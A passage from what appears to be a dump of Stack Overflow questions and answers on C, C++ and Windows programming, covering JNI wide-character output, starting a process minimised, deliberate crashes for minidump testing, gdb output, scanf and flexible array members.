</code></pre>

<h3>foo.c</h3>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;jni.h&gt;
#include ""JNIFoo.h""

JNIEXPORT void JNICALL Java_JNIFoo_nativeFoo (JNIEnv *env, jobject obj)
{
  fwprintf(stdout, L""using fWprintf\n"");
  fflush(stdout);
} 
</code></pre>

<p>Then I'm executing the following commands:</p>

<pre><code>javac JNIFoo.java
javah -jni JNIFoo
gcc -shared -fpic -o libfoo.so -I/path/to/jdk/include -I/path/to/jdk/include/linux foo.c
</code></pre>

<p>Here is the result depending of the JDK used to execute the program:</p>

<p><strong>jdk1.6.0_45</strong>/bin/java -Djava.library.path=/path/to/jni_test JNIFoo</p>

<blockquote>
  <p>using fWprintf </p>
  
  <p>The end</p>
</blockquote>

<p><strong>jdk1.7.0</strong>/bin/java -Djava.library.path=/path/to/jni_test JNIFoo</p>

<blockquote>
  <p>The end</p>
</blockquote>

<p><strong>jdk1.8.0_25</strong>/bin/java -Djava.library.path=/path/to/jni_test JNIFoo</p>

<blockquote>
  <p>The end</p>
</blockquote>

<p>As you can see, with JDK 1.7 and JDK 1.8, the fwprintf has no effect!</p>

<p>So my question is what am I missing to be able to use wide chars using JDK 1.7 (and 1.8) ?</p>

<p>Note: if I call <strong>fprintf</strong> instead of <strong>fwprintf</strong>, then there is no problem, everything is print out correctly.</p>

<h3>Edit</h3>

<p>Based on the comment of James, I created a main.c file:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;wchar.h&gt;
#include ""JNIFoo.h""

int main(int argc, char* argv[])
{
  fwprintf(stdout, L""In the main\n"");  
  Java_JNIFoo_nativeFoo(NULL, NULL);

  return 0;
}
</code></pre>

<p>Then I compile it like that:</p>

<pre><code>gcc -Wall -L/path/to/jni_test -I/path/to/jdk1.8.0_25/include -I/pat/to/jdk1.8.0_25/include/linux main.c -o main -lfoo
</code></pre>

<p>And set LD_LIBRARY_PATH</p>

<pre><code>export LD_LIBRARY_PATH=/path/to/jni_test
</code></pre>

<p>And it is working correctly:</p>

<pre><code>In the main
using fWprintf
</code></pre>

<p>So the problem may not come from C.</p>

<p>Note: it's working correctly on a 64-bit machine.
I have similar problem using linux Mint 32-bit.</p>
","9530","","<p>You must not mix printing of narrow and wide characters to the same stream.  C99 introduced the concept of <em>stream orientation</em> whereby an I/O stream can be <em>wide-oriented</em> or <em>byte-oriented</em> (prior to C99, wide characters did not exist in the C language standard).  From C99 §7.19.2/4–5:</p>

<blockquote>
  <p>4) Each stream has an <em>orientation</em>. After a stream is associated with an external file, but before any operations are performed on it, the stream is without orientation. Once a wide character input/output function has been applied to a stream without orientation, the stream becomes a <em>wide-oriented stream</em>. Similarly, once a byte input/output function has been applied to a stream without orientation, the stream becomes a <em>byte-oriented stream</em>. Only a call to the <code>freopen</code> function or the <code>fwide</code> function can otherwise alter the orientation of a stream. (A successful call to <code>freopen</code> removes any orientation.)<sup>233)</sup></p>
  
  <p>5) Byte input/output functions shall not be applied to a wide-oriented stream and wide character input/output functions shall not be applied to a byte-oriented stream. [...]</p>
  
  <p><sup>233)</sup> The three predefined streams <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> are unoriented at program startup.</p>
</blockquote>

<p>The C99 standard leaves mixing narrow- and wide-character functions as Undefined Behavior.  In practice, the GNU C library says ""There are no diagnostics issued. The application behavior will simply be strange or the application will simply crash. The <code>fwide</code> function can help avoiding this. "" (<a href=""http://www.gnu.org/software/libc/manual/html_node/Streams-and-I18N.html"" rel=""nofollow"">source</a>)</p>

<p>Since the JRE is in charge of program startup, it's in charge of the <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> streams and therefore also their orientations.  <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2010/04/30/10004931.aspx"" rel=""nofollow"">Your JNI code is a guest in its house, don't go changing its carpets.</a>  In practice, this means you have to deal with whatever stream orientation you're given, which you can detect with the <a href=""http://linux.die.net/man/3/fwide"" rel=""nofollow""><code>fwide(3)</code></a> function.  If you want to print wide characters to a byte-oriented stream, too bad.  You'll need to work around that by convincing the JRE to use wide-oriented streams, or convert your wide characters to UTF-8, or something else.</p>

<p>For example, this code should work in all cases:</p>

<pre><code>JNIEXPORT void JNICALL Java_JNIFoo_nativeFoo (JNIEnv *env, jobject obj)
{
  if (fwide(stdout, 0) &gt;= 0) {
    // The stream is wide-oriented or unoriented, so it's safe to print wide
    // characters
    fwprintf(stdout, L""using fWprintf\n"");
  } else {
    // The stream is narrow oriented.  Convert to UTF-8 (and hopefully the
    // terminal (or wherever stdout is going) can handle that)
    char *utf8_string = convert_to_utf8(L""my wide string"");
    printf(""%s"", utf8_string);
  }
  fflush(stdout);
}
</code></pre>
"
"<p>I am trying to automate an external Windows application. The goal is to make this application start minimized without showing any active window/splash screens and without stealing focus from other applications.</p>

<p>I wrote a little program on C that calls EnumWindows() in a loop and uses ShowWindow() to minimize the required window. It is quite fast and works in 80% of cases. Unfortunately, sometimes the application window is still showing and stealing the focus for a short period of time.</p>

<p>What would be a better (sure) way to intercept the window?
Is using SetWindowsHookEx hooks the only alternative?</p>
","9530","","<p>Have you tried using the <code>wShowWindow</code> member of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686331%28v=vs.85%29.aspx"" rel=""nofollow""><code>STARTUPINFO</code> structure</a> you pass to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateProcess()</code></a> when starting the application?  That was designed to do exactly things like this.</p>

<blockquote>
  <p>If dwFlags specifies STARTF_USESHOWWINDOW, this member can be any of the values that can be specified in the nCmdShow parameter for the ShowWindow function, except for SW_SHOWDEFAULT. Otherwise, this member is ignored.</p>
  
  <p>For GUI processes, the first time ShowWindow is called, its nCmdShow parameter is ignored wShowWindow specifies the default value. In subsequent calls to ShowWindow, the wShowWindow member is used if the nCmdShow parameter of ShowWindow is set to SW_SHOWDEFAULT.</p>
</blockquote>

<p>For example:</p>

<pre><code>STARTUPINFO si = { sizeof(si) }
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_MINIMIZE;

CreateProcess(..., &amp;si, ...);
</code></pre>
"
"<p>I've added a mini-core-dump feature (via __try/__except and MiniDumpWriteDump()) to the Windows build of my Qt application, so that if/when my application ever crashes, a .dmp file will be written out to disk for me to look at and debug with later on.</p>

<p>That works pretty well, but for testing I'd like to have a known-reliable method for making my program crash.  For example, there could be a ""crash now"" button in the GUI and when the user clicks it, it will cause the application to deliberately crash.</p>

<p>One way to do it, of course, is like this:</p>

<pre><code>int * badPointer = NULL;
*badPointer = 666;
</code></pre>

<p>And that works for me, but I don't like that approach because it relies on undefined behavior -- in particular, the C++ standard doesn't <em>require</em> the above code to cause a crash, so it's possible (from a language-lawyer perspective) that some future version of the compiler will not crash when the above code executes.</p>

<p>As a more ""official"" approach, I tried this:</p>

<pre><code>abort();
</code></pre>

<p>... which does terminate the program, but it doesn't cause the Windows Structured Exception that triggers the MiniCrashDump handler, so no .dmp file gets written.</p>

<p>My question is, is there an ""Official Right Way"" to crash my program?  I see that Windows API has a RaiseException() function that I could call, but I'm not sure what the proper arguments to it should be.  Is that the way to go, or is there some more specific call that I would be better off using?</p>
","9530","","<p>It's perfectly fine to dereference a null pointer to cause an access violation if you know you're running on Windows — Windows provides stronger guarantees than the C++ language.  C++ says that dereferencing a null pointer is Undefined Behavior, but Windows defines this as an access violation (which is perfectly acceptable as far as C++ is conerned, since an access violation is one possible result of Undefined Behavior).</p>

<p>From <a href=""http://msdn.microsoft.com/en-us/library/ms810627.aspx"" rel=""nofollow"">Managing Virtual Memory</a>:</p>

<blockquote>
  <p>Windows NT builds a safeguard into every process's address space. Both the upper and lower 65,536 bytes of each process are permanently reserved by the system. These portions of the address space are reserved to trap stray pointers—pointers that attempt to address memory in the range 00000000<sub>16</sub>-0000FFFF<sub>16</sub> or 7FFF0000<sub>16</sub>-7FFFFFFF<sub>16</sub>. Not coincidentally, it is easy to detect pointers in this range by simply ignoring the lower four nibbles (the rightmost two bytes) in these addresses. Essentially, a pointer is invalid if the upper four nibbles are 0000<sub>16</sub> or 7FFF<sub>16</sub>; all other values represent valid addresses.</p>
</blockquote>

<p>The first page of memory is always mapped as <code>PAGE_NOACCESS</code>, so if you attempt to read or write to a null pointer (or any pointer within +/-64 KB of a null pointer), you'll always raise an access violation exception.</p>
"
"<p>I was debugging a C++ code using gdb. The program stopped due to a segmentation fault. </p>

<pre><code>Program received signal SIGSEGV, Segmentation fault.
</code></pre>

<p>So I was trying to print out the value of variables to identify where the error is coming from. I have an array called 'ring' of type 'Link **', where Link is a class I defined. Each element in the array points to a 'Link *' variable. Here is the output when I print the first three elements of the 'ring' array.</p>

<pre><code>(gdb) print ring[0]
$13 = (Link *) 0x8125290
(gdb) print ring[1]
$14 = (Link *) 0xb7e80b86 &lt;exp+6&gt;
(gdb) print ring[2]
$15 = (Link *) 0x8132e20
</code></pre>

<p>Why am I getting '' after the memory address when printing 'ring[1]'? What does it mean?</p>

<p>EDIT: Im using gdb 7.8 on Arch Linux (3.16.4-1-ARCH)</p>
","9530","","<p>It means the pointer value is equal to the address of the <code>exp</code> symbol plus 6.  It's just the debugger trying to be helpful—whenever it decodes any pointer value, it tries to see if the pointer happens to lie near any known symbols in the object code, and it prints out that information if so.</p>

<p>You might expect to see such notation when examining the disassembly of a function's code, e.g. in branch targets, but as a data pointer, that's very unusual (function pointers would tend to point directly at function symbols, not offset into them).</p>

<p>You almost certainly have some kind of memory corruption bug that just happens to produce that value as a side effect.</p>
"
"<p>This is my code :</p>

<p>Note : \n inside scanf is my way to prevent trailing newline problem. That isn't best solution but i'm using it too much and currently it becoming my habit. :-)</p>

<pre><code>...

int main()
{
    unsigned long long int input[2], calc_square;

    while(scanf(""\n%I64u %I64u"", input[0], input[1]) == 2)
    {
        printf(""%I64u %I64u\n"", input[0], input[1]);

        ...
</code></pre>

<p>My expected input and program result is :</p>

<p>Input :</p>

<pre><code>89 89
</code></pre>

<p>For output, instead of printing back 89, it show this output :</p>

<pre><code>I64u I64u
</code></pre>

<p>I'm using g++ (GCC) 4.9.1 from MSYS2 package. Noted that g++ because there are some portion of my code currently using C++ STL.</p>

<hr>

<p>Edited : I changed my code by using standard <code>%llu</code> instead of <code>%I64u</code>, and here is my expected input and program result :</p>

<p>Input</p>

<pre><code>89 89
</code></pre>

<p>For output, it's kind a weird result :</p>

<pre><code>25769968512 2337536
</code></pre>
","9530","","<p>This code is wrong:</p>

<pre><code>while(scanf(""\n%I64u %I64u"", input[0], input[1]) == 2)
</code></pre>

<p><code>input[0]</code> and <code>input[1]</code> each have type <code>unsigned long long</code>, but they are required to have type <code>unsigned long long *</code> (<em>pointer</em> to <code>unsigned long long</code>) for <code>scanf</code> operations.  I'm unsure if MinGW supports checking <code>printf</code> and <code>scanf</code> format specifiers, but ordinary GCC is capable of detecting these kinds of errors at compile time <strong>as long as you enable the proper warnings</strong>.  I highly recommend always compiling with as high of a warning level as you possibly can, such as <code>-Wall -Wextra -Werror -pedantic</code> in the most extreme case.</p>

<p>You need to pass in the <em>address</em> of these variables:</p>

<pre><code>while(scanf(""\n%I64u %I64u"", &amp;input[0], &amp;input[1]) == 2)
//                           ^          ^
//                           |          |
</code></pre>
"
"<p>Fairly new to C and Unix.</p>

<p>I currently have:</p>

<pre><code>#include ""stdio.h""
#include &lt;dirent.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char ** argv)
{ char * current =  get_current_dir_name();    //where error occurs
  DIR * directory = NULL;
  directory = opendir(current);
  if(directory == NULL)
    return -1;
  struct dirent * ent;

  while((ent = readdir (directory)) != NULL)
    printf(""%s\n"", ent -&gt; d_name);

  if(closedir(directory) &lt; 0)
    return -1;
}
</code></pre>

<p>I'm being told: dir.c:15: warning: initialization makes pointer from integer without a cast</p>

<p>Clearly doing something pretty silly and could use some help.</p>
","9530","","<p>The standard function to get the name of the current working directory is <a href=""http://linux.die.net/man/3/getcwd"" rel=""nofollow""><code>getcwd()</code></a>, not <code>get_current_dir_name()</code>.  <code>get_current_dir_name()</code> is a GNU extension and is only available if the macro <code>_GNU_SOURCE</code> is defined prior to including <code>&lt;unistd.h&gt;</code>, and its use is not recommended.</p>

<p>In your case, <code>_GNU_SOURCE</code> is not defined, so consequently <code>get_current_dir_name()</code> is not the name of a declared function.  So when the C compiler sees your try to call it, it generates an <em>implicit declaration</em>.</p>

<p>Implicit function declarations create a declaration at the point of use declaring the function to take an arbitrary number and types of arguments and returning <code>int</code>.  Hence, in this case, the compiler thinks it has an <code>int</code> being assigned to a variable of type <code>char*</code>, so it generates the ""initialization makes pointer from integer without a cast warning"".</p>

<p>Implicit declarations are a deprecated feature of the C language and are in fact removed from the C99 edition of the language, although modern compilers still often accept them (with warnings) even in C99 mode.  Even in C89 mode, I highly recommend compiling with your warning level as high as possible to catch errors like this, e.g. <code>-Wall -Wextra -Werror -pedantic</code> if you can handle it.</p>
"
"<p>Hi I am trying to rum a C *.o using python 2.6.5 as follows</p>

<pre><code>import os
import sys
file_type = os.command('./file_type.o %s.txt 2&gt;&amp;1' % file_name)
</code></pre>

<p>And, it gives the error message :</p>

<pre><code>Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
AttributeError: 'module' object has no attribute 'command'
</code></pre>

<p>Being a beginner this might be a very trivial question, I request for the direction / help.</p>
","9530","","<p>There is no function named <code>command</code> in the <code>os</code> module, hence the error.  You probably meant to call <a href=""https://docs.python.org/2/library/os.html#os.system"" rel=""nofollow""><code>os.system()</code></a> instead.</p>
"
"<p>This is what InsertMenuItem() documentation say:</p>

<pre><code>uItem [in]

    Type: UINT

    The identifier or position of the menu item before which to insert the new item. The meaning of this parameter depends on the value of fByPosition.
</code></pre>

<p>But then what is the purpose of MENUITEMINFO.wID?</p>

<pre><code>wID

    Type: UINT

    An application-defined value that identifies the menu item. Set fMask to MIIM_ID to use wID.
</code></pre>

<p>Note that I tested both parameters, and only wID worked!</p>
","9530","","<blockquote>
  <p>But then what is the purpose of MENUITEMINFO.wID?</p>
</blockquote>

<p><code>uItem</code> controls the location <em>where the new menu item is inserted</em>.  <code>wID</code> controls the <em>ID of the new menu item</em>.</p>

<p>Suppose you have a menu with 3 items in it with identifiers <code>IDM_FOO</code>, <code>IDM_BAR</code>, and <code>IDM_BAZ</code>.  Now suppose you want to insert a 4th item with identifier <code>IDM_QUUX</code> into the menu between the <code>IDM_FOO</code> and <code>IDM_BAR</code> items.  You can do that by using <code>InsertMenuItem()</code> to insert it either before <code>IDM_BAR</code> (using <code>fByPosition == FALSE</code>) or before index 1 (using <code>fByPosition == TRUE</code>).  For example:</p>

<pre><code>MENUITEMINFO mii;
ZeroMemory(&amp;mii, sizeof(mii));
mii.cbSize = sizeof(mii);
mii.fMask = MIIM_ID | /* Other flags */;
mii.wID = IDM_QUUX;  // ID of new menu item to be inserted
// Fill out other fields
... 
// Insert new menu item before the IDM_BAR item
InsertMenuItem(hMenuParent, IDM_BAR, FALSE, &amp;mii);
...
// OR, insert new menu item before position 1
InsertMenuItem(hMenuParent, 1, TRUE, &amp;mii);
</code></pre>

<p>As for this comment:</p>

<blockquote>
  <p>Note that I tested both parameters, and only wID worked!</p>
</blockquote>

<p>You'll have to clarify what you mean by ""only wID worked.""  Worked how so?  What exactly did you do, what happened, and what did you expect to happen?  Make sure you read the documentation carefully to understand how the functions and structures are intended to work.</p>
"
"<p>I am attempting to port a library to Mac OS X. The compiler is reporting an incomplete type error. Specifically: field has incomplete type 'header_t []. However, when I look at the source code, header_t is defined just before packet_state_t, where packet_state_t references header_t. Thus, there shouldn't be any forward reference error, since header_t is clearly defined at the point at which it is referenced inside packet_state_t. The line in which the error occurs is marked with ERROR below. How to resolve?</p>

<pre><code> typedef struct header_t {
    uint8_t  hdr_id;         // header ID

    uint8_t  hdr_prefix;     // length of the prefix (preamble) before the header
    uint8_t  hdr_gap;        // length of the gap between header and payload
    uint16_t  hdr_flags;      // flags for this header
    uint16_t hdr_postfix;    // length of the postfix (trailer) after the payload
    uint32_t hdr_offset;     // offset into the packet_t-&gt;data buffer
    uint32_t hdr_length;     // length of the header in packet_t-&gt;data buffer
    uint32_t hdr_payload;    // length of the payload

    uint8_t   hdr_subcount;  // number of sub-headers
    header_t  *hdr_subheader;   // Index of the first subheader in packet_t

    jobject  hdr_analysis;   // Java JAnalysis based object if not null
} header_t;

typedef struct packet_state_t {
    flow_key_t pkt_flow_key; // Flow key calculated for this packet, must be first
    uint8_t pkt_flags;       // flags for this packet
    jobject pkt_analysis;    // Java JAnalysis based object if not null
    uint64_t pkt_frame_num;  // Packet's frame number assigned by scanner
    uint64_t pkt_header_map; // bit map of presence of headers

    uint32_t pkt_wirelen;    // Original packet size
    uint32_t pkt_buflen;     // Captured length

    int8_t pkt_header_count; // total number of main headers found
    header_t pkt_headers[];  // One per header + 1 more for payload ERROR HERE!!!

    int8_t pkt_subheader_count;  // total number of sub headers found
    header_t pkt_subheaders[];  // One per header + 1 more for payload
} packet_state_t;
</code></pre>
","9530","","<p>The type <code>header_t</code> is just fine, but the compiler is <em>actually</em> complaining about the type <code>header_t[]</code>, i.e. ""array of indeterminate length of <code>header_t</code>"", which has an incomplete type because the compiler doesn't know how big it is (it couldn't possibly).</p>

<p>C99 (but not C89) supports what's called a <em>flexible array member</em> in structures, which is exactly this, but <em>only</em> at the end of a structure:</p>

<pre><code>struct X {
  // any member declarations
  ...
  AnyType lastMemberArray[];  // This must be the LAST member
};
</code></pre>

<p>This is allowed, but it makes the structure you declared also an incomplete type because again, the compiler doesn't know how big it is.  The only way to use it is to dynamically allocate memory of the required size or to cast an already allocated block of memory.  For example:</p>

<pre><code>// Allocate an X instance with space for 3 members in lastMemberArray:
X *x = malloc(sizeof(X) + 3 * sizeof(AnyType));
// Can now use x-&gt;lastMemberArray[0] through x-&gt;lastMemberArray[2]
...

// Alternatively:
char buffer[sizeof(X) + 3 * sizeof(AnyType)];
X *x = (X *)buffer;
// Same as above
</code></pre>

<p>Why does the flexible array member have to come last in the struct?  Imagine if other members came after it.  How could the compiler generate code to access those members?</p>

<pre><code>// If this were allowed:
struct X {
  AnyType flexibleArray[];
  int memberAfter;
};

void doSomething(X *x) {
  // How does the compiler generate code for this?  It doesn't know what offset
  // memberAfter is from the start of the object, because the array doesn't
  // have a known size
  printf(""memberAfter = %d\n"", x-&gt;memberAfter);
}
</code></pre>

<p>Hence, you can't have a structure with more than one flexible array member, because then clearly one of them wouldn't be the last structure member, so your definition is not allowed.</p>

<p>Whatever library code you're writing, it couldn't have used two flexible array members to begin with, or it wouldn't have compiled on any platform.  I suggest you investigate the original code to find out what it did; if it's using standard ISO C features without relying on any platform-specific or implementation-specific behavior or extensions, you should have no trouble porting it.</p>

<p>Without being able to see the original code, I'd recommend you switch from using an inline flexible array member to a dynamically allocated array with a pointer, at least for the first array (and probably also the second for consistency):</p>

<pre><code>typedef struct packet_state_t {
    flow_key_t pkt_flow_key; // Flow key calculated for this packet, must be first
    uint8_t pkt_flags;       // flags for this packet
    jobject pkt_analysis;    // Java JAnalysis based object if not null
    uint64_t pkt_frame_num;  // Packet's frame number assigned by scanner
    uint64_t pkt_header_map; // bit map of presence of headers

    uint32_t pkt_wirelen;    // Original packet size
    uint32_t pkt_buflen;     // Captured length

    int8_t pkt_header_count; // total number of main headers found
    header_t *pkt_headers;   // POINTER here, not an array

    int8_t pkt_subheader_count;  // total number of sub headers found
    header_t *pkt_subheaders;    // POINTER here, not an array
} packet_state_t;
</code></pre>

<hr>

<p><strong>EDIT</strong></p>

<p>I downloaded the jnetpcap code and compiled it on Linux to see what happened.  To my surprise, it compiled.  The compiler command invoked was:</p>

<pre><code>gcc -c -fPIC -DLIBPCAP_VERSION=0x1532 -I/tmp/jnetpcap/build/include -I/tmp/jnetpcap/src/c -I/usr/lib/jvm/default-java/include -I/usr/lib/jvm/default-java/include/linux /tmp/jnetpcap/src/c/jnetpcap.cpp /tmp/jnetpcap/src/c/packet_flow.cpp /tmp/jnetpcap/src/c/packet_jheader.cpp /tmp/jnetpcap/src/c/jnetpcap_pcap_header.cpp /tmp/jnetpcap/src/c/nio_jbuffer.cpp /tmp/jnetpcap/src/c/winpcap_stat_ex.cpp /tmp/jnetpcap/src/c/winpcap_send_queue.cpp /tmp/jnetpcap/src/c/winpcap_ext.cpp /tmp/jnetpcap/src/c/util_debug.cpp /tmp/jnetpcap/src/c/util_crc16.c /tmp/jnetpcap/src/c/jnetpcap_ids.cpp /tmp/jnetpcap/src/c/jnetpcap_dumper.cpp /tmp/jnetpcap/src/c/jnetpcap_utils.cpp /tmp/jnetpcap/src/c/util_in_cksum.cpp /tmp/jnetpcap/src/c/jnetpcap_beta.cpp /tmp/jnetpcap/src/c/nio_jmemory.cpp /tmp/jnetpcap/src/c/util_crc32.c /tmp/jnetpcap/src/c/packet_jsmall_scanner.cpp /tmp/jnetpcap/src/c/mac_addr_sys.c /tmp/jnetpcap/src/c/packet_protocol.cpp /tmp/jnetpcap/src/c/nio_jnumber.cpp /tmp/jnetpcap/src/c/packet_jheader_scanner.cpp /tmp/jnetpcap/src/c/library.cpp /tmp/jnetpcap/src/c/packet_jscan.cpp /tmp/jnetpcap/src/c/jnetpcap_pcap100.cpp /tmp/jnetpcap/src/c/mac_addr_dlpi.c /tmp/jnetpcap/src/c/util_checksum.cpp /tmp/jnetpcap/src/c/packet_jpacket.cpp /tmp/jnetpcap/src/c/winpcap_ids.cpp /tmp/jnetpcap/src/c/jnetpcap_bpf.cpp
</code></pre>

<p>So the first thing that's going on here is that this is C++, not C.  C++ does not support flexible array members at all, although some compilers support them as extensions.  C++03 §9.2/8 says:</p>

<blockquote>
  <p>[...] When an array is used as the type of a nonstatic member all dimensions shall be specified.</p>
</blockquote>

<p>And C++11 §9.2/9 says:</p>

<blockquote>
  <p>9 Non-static (9.4) data members shall not have incomplete types. [...]</p>
</blockquote>

<p>When I compile this code in g++ 4.8.2 with a higher warning level (<code>-Wall -Wextra pedantic</code>), it warns as follows:</p>

<pre><code>In file included from /tmp/jnetpcap/src/c/packet_jscan.cpp:28:0:
/tmp/jnetpcap/src/c/packet_jscanner.h:287:23: warning: ISO C++ forbids zero-size array ‘pkt_headers’ [-Wpedantic]
  header_t pkt_headers[];  // One per header + 1 more for payload
                       ^
/tmp/jnetpcap/src/c/packet_jscanner.h:290:26: warning: ISO C++ forbids zero-size array ‘pkt_subheaders’ [-Wpedantic]
  header_t pkt_subheaders[];  // One per header + 1 more for payload
</code></pre>

<p>So what g++ is doing (contrary to the C++ standard) is converting the arrays of unspecified size to arrays of size 0.  The first one (<code>pkt_headers</code>) works exactly like the flexible array member in C99, in that if you've allocated the proper amount of memory, you can access the array members of that normally up to the maximum size.  But if you ever access any members <em>after</em> that (particularly <code>pkt_subheader_count</code> and <code>pkt_subheaders</code>), the compiler generates code as if <code>pkt_headers</code> had size 0, i.e. if the struct were equivalent to this:</p>

<pre><code>typedef struct packet_state_t {
    flow_key_t pkt_flow_key; // Flow key calculated for this packet, must be first
    uint8_t pkt_flags;       // flags for this packet
    jobject pkt_analysis;    // Java JAnalysis based object if not null
    uint64_t pkt_frame_num;  // Packet's frame number assigned by scanner
    uint64_t pkt_header_map; // bit map of presence of headers

    uint32_t pkt_wirelen;    // Original packet size
    uint32_t pkt_buflen;     // Captured length

    int8_t pkt_header_count; // total number of main headers found
    // NOTHING HERE (array of size 0)

    int8_t pkt_subheader_count;  // total number of sub headers found
    header_t pkt_subheaders[];  // One per header + 1 more for payload
} packet_state_t;
</code></pre>

<p>Which would cause accesses to <code>pkt_subheader_count</code> (and probably also access to <code>pkt_subheaders</code>) to access the exact same memory as as <code>pkt_headers[0]</code>.</p>

<p>Why does the happen to work out ok?  <strong>Because the code in this project never accesses <code>pkt_subheader_count</code> or <code>pkt_subheaders</code> anywhere.</strong>  If it did, the code wouldn't work for the reasons described above unless it got extraordinarily lucky.  And it's not valid C++, it just happens to be accepted by the compiler.</p>

<p>Solution?  Just remove <code>pkt_subheader_count</code> and <code>pkt_subheaders</code> from the structure declaration.  They're not used anywhere in code, and removing them allows <code>pkt_headers[]</code> to be the last member of the structure, so it's a valid flexible array member, which is valid C99 or a non-standard compiler extension in C++.</p>
"